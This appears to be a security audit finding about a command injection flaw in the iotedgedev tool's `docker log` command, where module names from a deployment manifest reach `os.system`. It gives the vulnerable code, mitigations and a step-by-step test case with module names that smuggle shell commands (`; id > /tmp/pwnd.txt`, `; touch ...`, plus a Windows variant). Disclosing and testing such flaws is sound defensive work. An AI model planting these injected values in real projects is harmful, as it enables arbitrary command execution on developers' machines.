### Vulnerability List:

- Vulnerability Name: Command Injection in `docker log` command via Module Name

- Description:
    - Step 1: An attacker crafts a malicious module name containing shell commands. For example, a module could be named `backdoor; id > /tmp/pwnd.txt`.
    - Step 2: The attacker creates or modifies a deployment manifest (e.g., `deployment.template.json`) to include this malicious module name. For instance, in the `modules` section, a module entry is created with the crafted name:
    ```json
    "backdoor; id > /tmp/pwnd.txt": {
        "version": "1.0",
        "type": "docker",
        "status": "running",
        "restartPolicy": "always",
        "settings": {
            "image": "${MODULES.backdoor}",
            "createOptions": {}
        }
    }
    ```
    - Step 3: The attacker executes the `iotedgedev docker log --show` or `iotedgedev docker log --save` command.
    - Step 4: The `iotedgedev docker log` command iterates through the modules listed in the deployment manifest. Due to the vulnerability, the malicious module name `backdoor; id > /tmp/pwnd.txt` is directly inserted into the `LOGS_CMD` environment variable's format string without proper sanitization.
    - Step 5: The `os.system(command)` or `subprocess` call in `handle_logs_cmd` function executes the crafted command, leading to command injection. In the example, this would execute `start /B start cmd.exe @cmd /k docker logs backdoor; id > /tmp/pwnd.txt -f` (or similar command depending on `LOGS_CMD` setting), which because of `os.system` and shell execution, interprets `; id > /tmp/pwnd.txt` as additional shell commands.

- Impact:
    - High. Successful command injection allows the attacker to execute arbitrary commands on the machine where `iotedgedev` tool is run. This can lead to full system compromise, data exfiltration, installation of malware, or further attacks on connected systems. In the context of IoT Edge development, this could compromise the developer's machine and potentially the development environment.

- Vulnerability Rank: Critical

- Currently Implemented Mitigations:
    - None. The code directly formats the module name into a shell command without any sanitization or validation.

- Missing Mitigations:
    - Input Sanitization: Module names should be strictly validated to allow only alphanumeric characters and underscores, preventing the injection of shell metacharacters.
    - Secure Command Execution: Instead of using `os.system` which invokes a shell, use `subprocess.Popen` with a list of arguments, which avoids shell interpretation and command injection vulnerabilities. When using `subprocess.Popen`, ensure that user-provided data is passed as arguments and not embedded directly into the command string.
    - Parameterized Queries: If possible, avoid constructing commands from strings. Utilize libraries or APIs that support parameterized queries or commands to separate code from data.

- Preconditions:
    - The attacker needs to be able to modify or create a deployment manifest file used by the `iotedgedev` tool. This could be achieved if the attacker has write access to the project directory or can influence the deployment manifest used by the developer.
    - The `iotedgedev docker log --show` or `iotedgedev docker log --save` command must be executed by the developer or user.

- Source Code Analysis:
    - File: `/code/iotedgedev/dockercls.py`
    - Function: `handle_logs_cmd(self, show, save)`
    - Code Snippet:
    ```python
    def handle_logs_cmd(self, show, save):
        # ...
        deployment_manifest = DeploymentManifest(self.envvars, self.output, self.utility, self.envvars.DEPLOYMENT_CONFIG_FILE_PATH, False)
        modules_in_config = list(deployment_manifest.get_all_modules().keys())

        for module in modules_in_config:
            if show:
                try:
                    command = self.envvars.LOGS_CMD.format(module) # Vulnerable line: Module name is directly formatted into command
                    os.system(command) # Vulnerable line: os.system executes shell command
                except Exception as ex:
                    self.output.error(
                        "Error while trying to open module log '{0}' with command '{1}'. Try `iotedgedev docker log --save` instead.".format(module, command))
                    self.output.error(str(ex))
            if save:
                try:
                    self.utility.exe_proc(["docker", "logs", module, ">", # Partially vulnerable - module is argument, but redirection `>` could be manipulated
                                           os.path.join(self.envvars.LOGS_PATH, module + ".log")], True)
                except Exception as ex:
                    self.output.error("Error while trying to save module log file '{0}'".format(module))
                    self.output.error(str(ex))
        # ...
    ```
    - Visualization:
        ```mermaid
        graph LR
            A[iotedgedev docker log --show/--save] --> B{handle_logs_cmd()};
            B --> C{DeploymentManifest.get_all_modules()};
            C --> D[Deployment Manifest (deployment.json)];
            D -- Module Names --> E{Loop through module names};
            E -- module_name --> F{command = LOGS_CMD.format(module_name)};
            F --> G{os.system(command)};
            G --> H[System Command Execution];
        ```
    - Step-by-step analysis:
        1. The `handle_logs_cmd` function is called when `iotedgedev docker log --show` or `iotedgedev docker log --save` is executed.
        2. It retrieves module names from the deployment manifest.
        3. It iterates through each module name.
        4. In the `show` branch, it formats the `LOGS_CMD` environment variable with the current `module` name.
        5. It uses `os.system(command)` to execute the formatted command. `os.system` executes the command in a subshell, making it vulnerable to command injection if `module` contains malicious shell commands.
        6. In the `save` branch, it uses `utility.exe_proc` which uses `subprocess.Popen` but still passes the command with shell=True for redirection `>`. While the docker command itself is passed as arguments, the redirection part could still be potentially manipulated if the module name is crafted to interfere with shell redirection syntax.

- Security Test Case:
    - Step 1: Create a new IoT Edge solution (e.g., `iotedgedev new test_exploit`).
    - Step 2: Navigate to the `modules` directory (`cd test_exploit/modules`).
    - Step 3: Create a file named `pwned_module.json` with the following content to simulate a module definition, only the name is important for the exploit:
    ```json
    {
        "image": {
            "repository": "dummyrepo/pwned_module",
            "tag": {
                "version": "0.0.1",
                "platforms": {
                    "amd64": "Dockerfile.amd64"
                }
            },
            "contextPath": "."
        }
    }
    ```
    - Step 4: Rename the module directory `filtermodule` to `backdoor; touch /tmp/pwned_docker_log_show` to create a malicious module name: `mv modules/filtermodule modules/'backdoor; touch /tmp/pwned_docker_log_show'`.
    - Step 5: Modify `deployment.template.json` to reflect the new module directory name. Change the module name in the `modules` section to `"backdoor; touch /tmp/pwned_docker_log_show"` and update the image placeholder accordingly.
    ```json
    "backdoor; touch /tmp/pwned_docker_log_show": {
        "version": "1.0",
        "type": "docker",
        "status": "running",
        "restartPolicy": "always",
        "settings": {
            "image": "${MODULES.backdoor}",
            "createOptions": {}
        }
    },
    ```
    - Step 6: Execute the command `iotedgedev docker log --show`.
    - Step 7: Check if the file `/tmp/pwned_docker_log_show` exists. If it exists, the command injection was successful. You can check by running `ls /tmp/pwned_docker_log_show`.

    - Step 8: (Optional) For `iotedgedev docker log --save`, modify step 4 to `mv modules/filtermodule modules/'backdoor; touch /tmp/pwned_docker_log_save'` and Step 6 to `iotedgedev docker log --save`. Check for `/tmp/pwned_docker_log_save`.

    - Note: For Windows environments, the command in step 4 and 5 should be adapted to Windows shell commands, for example: `rename modules\filtermodule 'backdoor& type nul > c:\windows\temp\pwned_docker_log_show'` and check for `c:\windows\temp\pwned_docker_log_show`. The touch command is used as a simple way to verify command execution. More harmful commands could be injected.